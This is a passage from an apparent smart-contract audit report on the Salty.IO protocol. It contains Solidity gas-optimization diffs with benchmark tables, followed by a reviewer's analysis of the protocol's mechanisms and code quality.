@@ -262,7 +262,7 @@ contract DAO is IDAO, Parameters, ReentrancyGuard
                        addedRewards[0] = AddedReward( pool1, bootstrappingRewards );
                        addedRewards[1] = AddedReward( pool2, bootstrappingRewards );

-                       exchangeConfig.salt().approve( address(liquidityRewardsEmitter), bootstrappingRewards * 2 );
+                       salt.approve( address(liquidityRewardsEmitter), bootstrappingRewards * 2 );
                        liquidityRewardsEmitter.addSALTRewards( addedRewards );

                        emit WhitelistToken(IERC20(ballot.address1));
```

## Define immutable variables for `wbtc` and `weth`(Save 253 Gas on average)

|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 7318 | 85131   | 50631  | 520885 |
| After  | 7252 | 84878   | 50455  | 517983 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L253-L258
```solidity
File: /src/dao/DAO.sol
253:                        // All tokens are paired with both WBTC and WETH, so whitelist both pairings
254:                        poolsConfig.whitelistPool( pools,  IERC20(ballot.address1), exchangeConfig.wbtc() );
255:                        poolsConfig.whitelistPool( pools,  IERC20(ballot.address1), exchangeConfig.weth() );


257:                        bytes32 pool1 = PoolUtils._poolID( IERC20(ballot.address1), exchangeConfig.wbtc() );
258:                        bytes32 pool2 = PoolUtils._poolID( IERC20(ballot.address1), exchangeConfig.weth() );
```


```diff
diff --git a/src/dao/DAO.sol b/src/dao/DAO.sol
index 3275f83..daf47b1 100644
--- a/src/dao/DAO.sol
+++ b/src/dao/DAO.sol
@@ -57,6 +57,8 @@ contract DAO is IDAO, Parameters, ReentrancyGuard
        ISalt immutable public salt;
        IUSDS immutable public usds;
        IERC20 immutable public dai;
+       IERC20 immutable public wbtc;
+       IERC20 immutable public weth;


        // The default IPFS URL for the website content (can be changed with a setWebsiteURL proposal)
@@ -85,6 +87,8 @@ contract DAO is IDAO, Parameters, ReentrancyGuard
         usds = exchangeConfig.usds();
         salt = exchangeConfig.salt();
         dai = exchangeConfig.dai();
+        wbtc = exchangeConfig.wbtc();
+        weth = exchangeConfig.weth();

                // Gas saving approves for eventually forming Protocol Owned Liquidity
                salt.approve(address(collateralAndLiquidity), type(uint256).max);
@@ -251,11 +255,11 @@ contract DAO is IDAO, Parameters, ReentrancyGuard
                        require( bestWhitelistingBallotID == ballotID, "Only the token whitelisting ballot with the most votes can be finalized" );

                        // All tokens are paired with both WBTC and WETH, so whitelist both pairings
-                       poolsConfig.whitelistPool( pools,  IERC20(ballot.address1), exchangeConfig.wbtc() );
-                       poolsConfig.whitelistPool( pools,  IERC20(ballot.address1), exchangeConfig.weth() );
+                       poolsConfig.whitelistPool( pools,  IERC20(ballot.address1), wbtc );
+                       poolsConfig.whitelistPool( pools,  IERC20(ballot.address1), weth );

-                       bytes32 pool1 = PoolUtils._poolID( IERC20(ballot.address1), exchangeConfig.wbtc() );
-                       bytes32 pool2 = PoolUtils._poolID( IERC20(ballot.address1), exchangeConfig.weth() );
+                       bytes32 pool1 = PoolUtils._poolID( IERC20(ballot.address1), wbtc );
+                       bytes32 pool2 = PoolUtils._poolID( IERC20(ballot.address1), weth );

                        // Send the initial bootstrappingRewards to promote initial liquidity on these two newly whitelisted pools
                        AddedReward[] memory addedRewards = new AddedReward[](2);
```


## Immutable variable already defined(Save 327 Gas on average)
|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 10259 | 126914   | 13406  | 382471 |
| After  | 10259 | 126587   | 13406  | 381816 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L180-L191
```solidity
File: /src/dao/Proposals.sol
180:        function proposeTokenUnwhitelisting( IERC20 token, string calldata tokenIconURL, string calldata description ) external nonReentrant returns (uint256 ballotID)
181:                {

187:                require( address(token) != address(exchangeConfig.salt()), "Cannot unwhitelist SALT" );
```

In the constructor, we have an immutable variable `salt` whose value is `exchangeConfig.salt()`:

```diff
diff --git a/src/dao/Proposals.sol b/src/dao/Proposals.sol
index 40ebd17..53964be 100644
--- a/src/dao/Proposals.sol
+++ b/src/dao/Proposals.sol
@@ -184,7 +184,7 @@ contract Proposals is IProposals, ReentrancyGuard
                require( address(token) != address(exchangeConfig.weth()), "Cannot unwhitelist WETH" );
                require( address(token) != address(exchangeConfig.dai()), "Cannot unwhitelist DAI" );
                require( address(token) != address(exchangeConfig.usds()), "Cannot unwhitelist USDS" );
-               require( address(token) != address(exchangeConfig.salt()), "Cannot unwhitelist SALT" );
+               require( address(token) != address(salt), "Cannot unwhitelist SALT" );
```


## Expensive operation inside a for loop(Save 640 Gas on average)
|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 677 | 15275   | 17655  | 22043 |
| After  | 677 | 14635   | 17019  | 20751 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L321-L327
```solidity
File: /src/stable/CollateralAndLiquidity.sol
321:                        for ( uint256 i = startIndex; i <= endIndex; i++ )
322:                                {
323:                                address wallet = _walletsWithBorrowedUSDS.at(i);

326:                                uint256 minCollateralValue = (usdsBorrowedByUsers[wallet] * stableConfig.minimumCollateralRatioPercent()) / 100;
```

Calling `stableConfig.minimumCollateralRatioPercent()` inside the loop is too expensive as this is an external call:

```diff
diff --git a/src/stable/CollateralAndLiquidity.sol b/src/stable/CollateralAndLiquidity.sol
index fc14695..a7d0e6d 100644
--- a/src/stable/CollateralAndLiquidity.sol
+++ b/src/stable/CollateralAndLiquidity.sol
@@ -317,13 +317,14 @@ contract CollateralAndLiquidity is Liquidity, ICollateralAndLiquidity
                uint256 totalCollateralShares = totalShares[collateralPoolID];
                uint256 totalCollateralValue = totalCollateralValueInUSD();

-               if ( totalCollateralValue != 0 )
+               if ( totalCollateralValue != 0 ){
+                       uint256 _minimumCollateralRatioPercent = stableConfig.minimumCollateralRatioPercent();
                        for ( uint256 i = startIndex; i <= endIndex; i++ )
                                {
                                address wallet = _walletsWithBorrowedUSDS.at(i);

                                // Determine the minCollateralValue a user needs to have based on their borrowedUSDS
-                               uint256 minCollateralValue = (usdsBorrowedByUsers[wallet] * stableConfig.minimumCollateralRatioPercent()) / 100;
+                               uint256 minCollateralValue = (usdsBorrowedByUsers[wallet] * _minimumCollateralRatioPercent) / 100;

                                // Determine minCollateral in terms of minCollateralValue
                                uint256 minCollateral = (minCollateralValue * totalCollateralShares) / totalCollateralValue;
```

## Avoid making unnecessary external calls(Save 4285 Gas on average)
**Gas benchmarks based on function finalizeBallot**
|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 7296 | 85003   | 50499  | 520797 |
| After  | 7296 | 80718   | 43300  | 520797 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L113-L128

```solidity
File: /src/dao/DAO.sol
113:        function _finalizeParameterBallot( uint256 ballotID ) internal
114:                {
115:                Ballot memory ballot = proposals.ballotForID(ballotID);

117:                Vote winningVote = proposals.winningParameterVote(ballotID);

119:                if ( winningVote == Vote.INCREASE )
120:                        _executeParameterChange( ParameterTypes(ballot.number1), true, poolsConfig, stakingConfig, rewardsConfig, stableConfig, daoConfig, priceAggregator );
121:                else if ( winningVote == Vote.DECREASE )
122:                        _executeParameterChange( ParameterTypes(ballot.number1), false, poolsConfig, stakingConfig, rewardsConfig, stableConfig, daoConfig, priceAggregator );
```

The above function is called by `finalizeBallot` which has the following implementation
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L278-L292
```solidity
        function finalizeBallot( uint256 ballotID ) external nonReentrant
                {

				<--- Truncated-->
                Ballot memory ballot = proposals.ballotForID(ballotID);


                if ( ballot.ballotType == BallotType.PARAMETER )
                        _finalizeParameterBallot(ballotID);
                else if ( ballot.ballotType == BallotType.WHITELIST_TOKEN )
                        _finalizeTokenWhitelisting(ballotID);
                else
                        _finalizeApprovalBallot(ballotID);
                }


```

Note, in both functions, we make a very similar external call `Ballot memory ballot = proposals.ballotForID(ballotID);`
Since external calls can be quite expensive, inlining here would be the best solution so that we only make the external call once:

```diff
diff --git a/src/dao/DAO.sol b/src/dao/DAO.sol
index 3275f83..7df6949 100644
--- a/src/dao/DAO.sol
+++ b/src/dao/DAO.sol
@@ -282,8 +282,19 @@ contract DAO is IDAO, Parameters, ReentrancyGuard

                Ballot memory ballot = proposals.ballotForID(ballotID);

-               if ( ballot.ballotType == BallotType.PARAMETER )
-                       _finalizeParameterBallot(ballotID);
+               if ( ballot.ballotType == BallotType.PARAMETER ){
+                       Vote winningVote = proposals.winningParameterVote(ballotID);
+
+                       if ( winningVote == Vote.INCREASE )
+                               _executeParameterChange( ParameterTypes(ballot.number1), true, poolsConfig, stakingConfig, rewardsConfig, stableConfig, daoConfig, priceAggregator );
+                       else if ( winningVote == Vote.DECREASE )
+                               _executeParameterChange( ParameterTypes(ballot.number1), false, poolsConfig, stakingConfig, rewardsConfig, stableConfig, daoConfig, priceAggregator );
+
+                       // Finalize the ballot even if NO_CHANGE won
+                       proposals.markBallotAsFinalized(ballotID);
+
+                       emit BallotFinalized(ballotID, winningVote);
+               }
                else if ( ballot.ballotType == BallotType.WHITELIST_TOKEN )
                        _finalizeTokenWhitelisting(ballotID);
                else
```

## Refactor the code to avoid unnecessary external calls(Save 1300 Gas on average)
**Gas benchmarks based on function finalizeBallot**
|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 7296 | 85003   | 50499  | 520797 |
| After  | 7296 | 83700   | 50444  | 520796 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L219-L228
```solidity
File: /src/dao/DAO.sol
219:        function _finalizeApprovalBallot( uint256 ballotID ) internal
220:                {
221:                if ( proposals.ballotIsApproved(ballotID ) )
222:                        {
223:                        Ballot memory ballot = proposals.ballotForID(ballotID);
224:                        _executeApproval( ballot );
225:                        }

227:                proposals.markBallotAsFinalized(ballotID);
228:                }
```

The function `_finalizeApprovalBallot` is called by `finalizeBallot` which has the following implementation:

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L278-L291

```solidity
        function finalizeBallot( uint256 ballotID ) external nonReentrant
                {

                Ballot memory ballot = proposals.ballotForID(ballotID);


                if ( ballot.ballotType == BallotType.PARAMETER )
                        _finalizeParameterBallot(ballotID);
                else if ( ballot.ballotType == BallotType.WHITELIST_TOKEN )
                        _finalizeTokenWhitelisting(ballotID);
                else
                        _finalizeApprovalBallot(ballotID);
                }
```

Both functions are making the same external call `Ballot memory ballot = proposals.ballotForID(ballotID);` which wastes too much gas. Inlining the call can save us one external call:

```diff
diff --git a/src/dao/DAO.sol b/src/dao/DAO.sol
index 3275f83..aa3efe9 100644
--- a/src/dao/DAO.sol
+++ b/src/dao/DAO.sol
@@ -286,8 +286,14 @@ contract DAO is IDAO, Parameters, ReentrancyGuard
                        _finalizeParameterBallot(ballotID);
                else if ( ballot.ballotType == BallotType.WHITELIST_TOKEN )
                        _finalizeTokenWhitelisting(ballotID);
-               else
-                       _finalizeApprovalBallot(ballotID);
+               else {
+                       if ( proposals.ballotIsApproved(ballotID ) )
+                       {
+                               _executeApproval( ballot );
+                       }
+
+                       proposals.markBallotAsFinalized(ballotID);
+               }
                }
```


## We should cache the result of a function instead of calling it twice(Save 178 Gas on average )
|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 1102 | 69116   | 69740  | 78240 |
| After  | 1102 | 68938   | 69560  | 78060 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/launch/Airdrop.sol#L56-L70
```solidity
File: /src/launch/Airdrop.sol
56:    function allowClaiming() external
57:        {

60:        require(numberAuthorized() > 0, "No addresses authorized to claim airdrop.");

63:        uint256 saltBalance = salt.balanceOf(address(this));
64:                saltAmountForEachUser = saltBalance / numberAuthorized();
```

The function  `allowClaiming()` calls `numberAuthorized()` 2 times.
The function `numberAuthorized()` is implemented as follows
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/launch/Airdrop.sol#L97-L100
```solidity
    function numberAuthorized() public view returns (uint256)
        {
        return _authorizedUsers.length();
        }
```
Note, it makes a state read(SLOAD) to get the length `_authorizedUsers.length()`
Doing this two times is expensive, we should simply save the results of this call and cache them:

```diff
@@ -57,11 +57,12 @@ contract Airdrop is IAirdrop, ReentrancyGuard
        {
        require( msg.sender == address(exchangeConfig.initialDistribution()), "Airdrop.allowClaiming can only be called by the InitialDistribution contract" );
        require( ! claimingAllowed, "Claiming is already allowed" );
-               require(numberAuthorized() > 0, "No addresses authorized to claim airdrop.");
+               uint256 _numberAuthorized = numberAuthorized();
+               require(_numberAuthorized > 0, "No addresses authorized to claim airdrop.");

        // All users receive an equal share of the airdrop.
        uint256 saltBalance = salt.balanceOf(address(this));
-               saltAmountForEachUser = saltBalance / numberAuthorized();
+               saltAmountForEachUser = saltBalance / _numberAuthorized;

                // Have the Airdrop approve max so that that xSALT (staked SALT) can later be transferred to airdrop recipients.
                salt.approve( address(staking), saltBalance );
```

If we revert on the first check, then we would waste ~6 gas but in the case we don't revert, we save an entire SLOAD(100 Gas).

## Avoid reading state variables due to how the logic is executed(Save 1 SLOAD: 100 Gas)
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/ManagedWallet.sol#L73-L81
```solidity
File: /src/ManagedWallet.sol
73:        function changeWallets() external
74:                {
75:                // proposedMainWallet calls the function - to make sure it is a valid address.
76:                require( msg.sender == proposedMainWallet, "Invalid sender" );
77:                require( block.timestamp >= activeTimelock, "Timelock not yet completed" );

79:                // Set the wallets
80:                mainWallet = proposedMainWallet;
81:                confirmationWallet = proposedConfirmationWallet;
```

Due to the require statement on line 76, it's guaranteed that `proposedMainWallet` will be equal to `msg.sender` if we do get to the `set the wallets` part. If they are not equal then the require statement would revert.
Therefore, any occurence of `proposedMainWallet` which is a state variable can be replaced by `msg.sender` which is a global variable therefore cheaper to read:

```diff
diff --git a/src/ManagedWallet.sol b/src/ManagedWallet.sol
index 7082030..99c3ed0 100644
--- a/src/ManagedWallet.sol
+++ b/src/ManagedWallet.sol
@@ -77,10 +77,10 @@ contract ManagedWallet is IManagedWallet
                require( block.timestamp >= activeTimelock, "Timelock not yet completed" );

                // Set the wallets
-               mainWallet = proposedMainWallet;
+               mainWallet = msg.sender;
                confirmationWallet = proposedConfirmationWallet;

-               emit WalletChange(mainWallet, confirmationWallet);
+               emit WalletChange(msg.sender, confirmationWallet);

                // Reset
                activeTimelock = type(uint256).max;
```


## Prioritize validating cheap variables first

### Cheaper to validate `block.timestamp >= completionTimestamp` first
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/launch/BootstrapBallot.sol#L69-L72
```solidity
File: /src/launch/BootstrapBallot.sol
69:        function finalizeBallot() external nonReentrant
70:                {
71:                require( ! ballotFinalized, "Ballot has already been finalized" );
72:                require( block.timestamp >= completionTimestamp, "Ballot is not yet complete" );
```
The first check involves making an SLOAD to read the value of `ballotFinalized`. If this check passes but the second reverts, we waste the gas in the first check. We should reorder this checks to have the cheaper one first. 

```diff
        function finalizeBallot() external nonReentrant
                {
-               require( ! ballotFinalized, "Ballot has already been finalized" );
                require( block.timestamp >= completionTimestamp, "Ballot is not yet complete" );
+               require( ! ballotFinalized, "Ballot has already been finalized" );
```


### Validate `liquidityToRemove` before reading from state
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L170-L173
```solidity
File: /src/pools/Pools.sol
170:        function removeLiquidity( IERC20 tokenA, IERC20 tokenB, uint256 liquidityToRemove, uint256 minReclaimedA, uint256 minReclaimedB, uint256 totalLiquidity ) external nonReentrant returns (uint256 reclaimedA, uint256 reclaimedB)
171:                {
172:                require( msg.sender == address(collateralAndLiquidity), "Pools.removeLiquidity is only callable from the CollateralAndLiquidity contract" );
173:                require( liquidityToRemove > 0, "The amount of liquidityToRemove cannot be zero" );
```

```diff
        function removeLiquidity( IERC20 tokenA, IERC20 tokenB, uint256 liquidityToRemove, uint256 minReclaimedA, uint256 minReclaimedB, uint256 totalLiquidity ) external nonReentrant returns (uint256 reclaimedA, uint256 reclaimedB)
                {
-               require( msg.sender == address(collateralAndLiquidity), "Pools.removeLiquidity is only callable from the CollateralAndLiquidity contract" );
                require( liquidityToRemove > 0, "The amount of liquidityToRemove cannot be zero" );
+               require( msg.sender == address(collateralAndLiquidity), "Pools.removeLiquidity is only callable from the CollateralAndLiquidity contract" );

                (bytes32 poolID, bool flipped) = PoolUtils._poolIDAndFlipped(tokenA, tokenB);
```


### Validate the function parameters before making the state reads
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/PoolsConfig.sol#L45-L48
```solidity
File: /src/pools/PoolsConfig.sol
45:        function whitelistPool( IPools pools, IERC20 tokenA, IERC20 tokenB ) external onlyOwner
46:                {
47:                require( _whitelist.length() < maximumWhitelistedPools, "Maximum number of whitelisted pools already reached" );
48:                require(tokenA != tokenB, "tokenA and tokenB cannot be the same token");
```


```diff
        function whitelistPool( IPools pools, IERC20 tokenA, IERC20 tokenB ) external onlyOwner
                {
-               require( _whitelist.length() < maximumWhitelistedPools, "Maximum number of whitelisted pools already reached" );
                require(tokenA != tokenB, "tokenA and tokenB cannot be the same token");
+               require( _whitelist.length() < maximumWhitelistedPools, "Maximum number of whitelisted pools already reached" );

```

### Validate the function parameter first before making any state reads
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/USDS.sol#L40-L43
```solidity
File: /src/stable/USDS.sol
40:        function mintTo( address wallet, uint256 amount ) external
41:                {
42:                require( msg.sender == address(collateralAndLiquidity), "USDS.mintTo is only callable from the Collateral contract" );
43:                require( amount > 0, "Cannot mint zero USDS" );
```

```diff
        function mintTo( address wallet, uint256 amount ) external
                {
-               require( msg.sender == address(collateralAndLiquidity), "USDS.mintTo is only callable from the Collateral contract" );
                require( amount > 0, "Cannot mint zero USDS" );
+               require( msg.sender == address(collateralAndLiquidity), "USDS.mintTo is only callable from the Collateral contract" );
```

### Validate `amountRepaid` before making any state read
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L115-L119
```solidity
File: /src/stable/CollateralAndLiquidity.sol
115:     function repayUSDS( uint256 amountRepaid ) external nonReentrant
116:                {
117:                require( userShareForPool( msg.sender, collateralPoolID ) > 0, "User does not have any collateral" );
118:                require( amountRepaid <= usdsBorrowedByUsers[msg.sender], "Cannot repay more than the borrowed amount" );
119:                require( amountRepaid > 0, "Cannot repay zero amount" );
```

```diff
      function repayUSDS( uint256 amountRepaid ) external nonReentrant
                {
+               require( amountRepaid > 0, "Cannot repay zero amount" );
                require( userShareForPool( msg.sender, collateralPoolID ) > 0, "User does not have any collateral" );
                require( amountRepaid <= usdsBorrowedByUsers[msg.sender], "Cannot repay more than the borrowed amount" );
-               require( amountRepaid > 0, "Cannot repay zero amount" );
```

### Refactor function to only make state assignments after parameter verification
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/Staking.sol#L198-L205
```solidity
File: /src/staking/Staking.sol
198:        function calculateUnstake( uint256 unstakedXSALT, uint256 numWeeks ) public view returns (uint256)
199:                {
200:                uint256 minUnstakeWeeks = stakingConfig.minUnstakeWeeks();
201:        uint256 maxUnstakeWeeks = stakingConfig.maxUnstakeWeeks();
202:        uint256 minUnstakePercent = stakingConfig.minUnstakePercent();

204:                require( numWeeks >= minUnstakeWeeks, "Unstaking duration too short" );
205:                require( numWeeks <= maxUnstakeWeeks, "Unstaking duration too long" );
```
The require statements only depend on the first two variables `minUnstakeWeeks` and `maxUnstakeWeeks`. We can therefore move the assignment of `minUnstakePercent` to be after all checks are passed.

```diff
diff --git a/src/staking/Staking.sol b/src/staking/Staking.sol
index 22e5970..c00c419 100644
--- a/src/staking/Staking.sol
+++ b/src/staking/Staking.sol
@@ -199,10 +199,12 @@ contract Staking is IStaking, StakingRewards
                {
                uint256 minUnstakeWeeks = stakingConfig.minUnstakeWeeks();
         uint256 maxUnstakeWeeks = stakingConfig.maxUnstakeWeeks();
-        uint256 minUnstakePercent = stakingConfig.minUnstakePercent();

                require( numWeeks >= minUnstakeWeeks, "Unstaking duration too short" );
                require( numWeeks <= maxUnstakeWeeks, "Unstaking duration too long" );
+
+        uint256 minUnstakePercent = stakingConfig.minUnstakePercent();
+

                uint256 percentAboveMinimum = 100 - minUnstakePercent;
                uint256 unstakeRange = maxUnstakeWeeks - minUnstakeWeeks;
```

**[othernet-global (Salty.IO) acknowledged](https://github.com/code-423n4/2024-01-salty-findings/issues/889#issuecomment-1939638399)**

***

# Audit Analysis

For this audit, 22 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-01-salty-findings/issues/910) by **peanuts** received the top score from the judge.

*The following wardens also submitted reports: [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/1008), [niroh](https://github.com/code-423n4/2024-01-salty-findings/issues/795), [0xAsen](https://github.com/code-423n4/2024-01-salty-findings/issues/779), [LinKenji](https://github.com/code-423n4/2024-01-salty-findings/issues/772), [ZanyBonzy](https://github.com/code-423n4/2024-01-salty-findings/issues/538), [kinda\_very\_good](https://github.com/code-423n4/2024-01-salty-findings/issues/1039), [fouzantanveer](https://github.com/code-423n4/2024-01-salty-findings/issues/1017), [Sathish9098](https://github.com/code-423n4/2024-01-salty-findings/issues/961), [hunter\_w3b](https://github.com/code-423n4/2024-01-salty-findings/issues/959), [hassanshakeel13](https://github.com/code-423n4/2024-01-salty-findings/issues/954), [kaveyjoe](https://github.com/code-423n4/2024-01-salty-findings/issues/949), [DedOhWale](https://github.com/code-423n4/2024-01-salty-findings/issues/916), [yongskiws](https://github.com/code-423n4/2024-01-salty-findings/issues/873), [foxb868](https://github.com/code-423n4/2024-01-salty-findings/issues/768), [0xepley](https://github.com/code-423n4/2024-01-salty-findings/issues/714), [jauvany](https://github.com/code-423n4/2024-01-salty-findings/issues/651), [K42](https://github.com/code-423n4/2024-01-salty-findings/issues/641), [catellatech](https://github.com/code-423n4/2024-01-salty-findings/issues/562), [0xSmartContract](https://github.com/code-423n4/2024-01-salty-findings/issues/537), [rspadi](https://github.com/code-423n4/2024-01-salty-findings/issues/193), and [0xHelium](https://github.com/code-423n4/2024-01-salty-findings/issues/191).*

### Approach taken when reviewing the protocol

This is a pretty large codebase, so I started with trying to understand the protocol first, before reading the code and getting the general idea of the protocol:

1. Watched the Video Technical Walkthrough to get a sense of the protocol.
2. Looked at the codes with the least amount of lines and started from there. 
3. Started to understand the protocol a little more and grouped the contracts into different sections (Airdrop Section, Config Section, ERC20 Section, DEX Section, Lending Section, Staking Section)
4. Started linking the sections together and seeing how each contract affects another contract (eg how Airdrop section relates to Staking and Staking rewards)
5. Started understanding the Airdrop Section first, InitialDistribution, Airdrop and BootstrapBallot
6. Next, started figuring out the staking section. (SALT staking, xSALT staking)
7. Analyze the DAO and notice how the DAO has the capability of submitting proposals that affects every contract
8. After finishing the DAO, Parameters, Proposals and all the Config, went to look at Pools.
9. Compared the code of Pools to Uniswap V2 (similar idea), to see any difference between how both protocols tackle AMM functionality
10. Analyze the lending section (WBTC-WETH), Collaterization Ratio, Liquidation process (liquidizer)
11. Checked the PriceAggregators (Chainlink, Salt and Uniswap) and cross-compare to the whole lending process
12. Fill in the gaps (Arbitrage, Math)
13. Started end-to-end scenario analysis for hypothetical users (eg a user stakes 100 SALT. What happens? How much votes does he have?)
14. Looked through the test files.
15. Wrote the QA, Analysis and Report whilst going through the protocol

### Summary and Mechanism Review

**Airdropping tokens**

User's POV:

1. The user must have a signature (be whitelisted or something else) and call BootstrapBallot.vote().
2. The user can vote yes or no to start the exchange
3. There is a time limit for the voting duration
4. Once the vote ends, if the vote passes, then users can go to claimAirdrop() and claim their SALT tokens
5. Note that the SALT cannot be claimed immediately, but is staked for the user. To claim the SALT directly, they have to call unstake and wait 52 weeks for the total duration.

- Mechanism is well thought out, users can only vote once and claim once.
- The amount of SALT distributed is distributed equally (5 million), and if there is low number of votes(), then authorized voters can get more SALT.
- It is uncertain how users can obtain a signature in order to be eligible to vote. If getting into the whitelist is easy, then users can create multiple accounts to vote (no) and grief the whole protocol (costs a lot of gas for them though)
- An important thing to note is that the vote can fail, and if the vote does fail, what happens next? Will the contract be redeployed?
- Also, if there are 0 authorized voters (extremely unlikely), then the whole process will fail.
- Contracts used: Airdrop.sol, BootstrapBallot.sol, InitialDistribution.sol, ExchangeConfig.sol, Staking.sol
- Mechanism is dependant on users calling vote and users actually voting yes.


**Depositing Collateral and Minting USDS**

User's POV:

1. The user deposits WBTC and WETH token into the Pools contract through CollateralAndLiquidity.depositCollateralAndIncreaseShare().
2. Users can call `borrowUSDS()` to mint USDS. 
3. Users can repay their USDS debt by calling `repayUSDS()`.

- A common collaterized stablecoin mechanism. Having an initial collateral ratio and minimum collateral ratio is good so that the users position will not get immediately liquidated when withdrawing the max amount of debt
- Initial Collateral ratio is set as 200%, with a 150-300% range. Mincollateral ratio is set at 110%, with a 110-120 range
- Users have to repay their USDS in order to withdraw their liquidity, which is correct.

**Liquidation**

Liquidator's POV:

1. Liquidator calls `liquidateUser()` in CollateralAndLiquidity.sol
2. If the user is primed for liquidation, all his WBTC and WETH tokens will be withdrawn from the pool.
3. The liquidator gets 5% of the WBTC and WETH tokens.
4. The WBTC and WETH tokens will be sent to the Liquidizer contract, get swapped to USDS and burnt
5. The liquidated user gets to keep his USDS debt.

- Interesting mechanism for liquidation. Normally, the liquidator will repay the debt, but in this case the liquidator simply calls a function. 
- Unsure how burning the WBTC and WETH token will help the USDS token. Probably through the rebalancing of the pools?
- Liquidation rewards can range from 5-10%. 

**Depositing liquidity**

User's POV:

1. User can deposit liquidity through `Liquidity.depositLiquidityAndIncreaseShare()`. Take note that users can only deposit into whitelisted pools and that the tokens are whitelisted. 
2. User can withdraw liquidity through `Liquidity.withdrawLiquidityAndClaim()`. Note that there is a buffer time between depositing and withdrawing liquidity to prevent any flashloan rewards exploit.
3. When liquidity is withdrawn, SALT rewards will be distributed to the liquidity provider.

- There is no ERC20 liquidity token issued. Liquidity is just the combination of the amount of token A and token B, which get's pretty confusing when both tokens have different decimals.
- Users can only deposit an equal ratio of token A and token B, which is good to prevent any liquidity imbalance exploit.

**Staking SALT**

User's POV:

1. User calls `stakeSALT()` in the Staking.sol contract. The user's wallet must have access first
2. User shares is increased. When SALT is staked, it becomes xSALT. Users can use xSALT as voting power to ballot in proposals
3. User can unstake xSALT for SALT. The unstaking process is between 1 week to 1 year with a penalty of 80% for faster unstaking.
4. The SALT that is penalized from unstaking prematurely will be burned.
5. Users can cancel their `unstake()` at any point in time.

- Normal Staking mechanism, with penalties. Note that the user's votes still exist even when unstake is called.

**Swapping Tokens**

- Users can call depositSwapWithdraw() to swap tokens from a whitelisted pool (assuming it has enough liquidity)
- Instead of a typical AMM swap, it adjusts the reserves and attempt an arbitrage, which is a novel concept

### Codebase quality analysis

**[PoolsConfig.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolsConfig.sol)**

| Contract    | Function                                  | Access         | Comments                                                                         |
| ----------- | ----------------------------------------- | -------------- | -------------------------------------------------------------------------------- |
| PoolsConfig | whitelistPool                             | onlyOwner, DAO | From 10-100 max pools, calls updateArbitrageIndicies                             |
| PoolsConfig | unwhitelistPool                           | onlyOwner, DAO | unwhitelist the pools, what if still have liquidity inside? can it be taken out? |
| PoolsConfig | changeMaximumWhitelistedPools             | onlyOwner, DAO | from 20-100 with a default of 50                                                 |
| PoolsConfig | changeMaximumInternalSwapPercentTimes1000 | onlyOwner, DAO | from 0.25% to 2% with a default of 1%                                            |

- The check for whitelist is from the increaseuserShare function. It seems that decreaseUserShare doesn't check for whitelist, which is correct.
- Since the owner is the only whitelisting the pool, issues with whitelisting pools will fall under centralization risks

**[CoreChainlinkFeed.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreChainlinkFeed.sol)**

| Contract          | Function             | Access        | Comments                                                                                                  |
| ----------------- | -------------------- | ------------- | --------------------------------------------------------------------------------------------------------- |
| CoreChainlinkFeed | latestChainlinkPrice | view function | Called when trying to get a loan, will get WBTC and WETH price. Note that WBTC is returned as 18 decimals |

- **A few Potential Issues**
- The `latestRoundData` is not sufficiently checked, may return stale prices.
- MAX_ANSWER_DELAY is fixed, so make sure that BTC and ETH feeds also have the same delay
- Price returning as 0 instead of reverting can be dangerous. Not sure if it's the best for the protocol since it uses a price aggregator, if another price feed is manipulated then the zero return will be detrimental, however the scenario where 2 price feeds are down simultaneously is pretty unlikely
- Other than that, price return and use of latestRoundData is correct

**[DAOConfig.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAOConfig.sol)**

| Contract  | Function                              | Access                  | Comments                               |
| --------- | ------------------------------------- | ----------------------- | -------------------------------------- |
